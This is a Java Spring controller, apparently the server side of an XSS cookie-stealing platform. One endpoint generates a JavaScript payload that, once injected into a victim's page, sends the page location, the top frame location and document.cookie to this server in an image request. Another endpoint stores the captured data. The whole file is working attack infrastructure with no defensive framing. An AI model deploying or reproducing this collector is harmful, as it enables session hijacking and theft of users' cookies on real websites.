package org.blue.xss.controller;

import java.io.PrintWriter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.blue.xss.bean.Content;
import org.blue.xss.service.ApiService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
@Scope("prototype")
public class ApiController {
	@Autowired
	private ApiService apiService;

	@RequestMapping(value = "api")
	public void insertContent(Content content, PrintWriter printWriter) {

		apiService.insertContent(content);

		printWriter.print("");
	}

	@RequestMapping(value = "i")
	public void printJavaScriptCode(int pid, HttpServletRequest request,
			HttpServletResponse resp, PrintWriter printWriter) {

		String path = request.getContextPath();
		String basePath = request.getScheme() + "://" + request.getServerName()
				+ ":" + request.getServerPort() + path + "/";

		String code = "﻿﻿﻿(function(){(new Image()).src='"
				+ basePath
				+ "api.x?pid="
				+ pid
				+ "&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&domain='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&content='+escape((function(){try{return document.cookie}catch(e){return ''}})())})();";

		printWriter.print(code);

		resp.setContentType("application/javascript");
	}

}
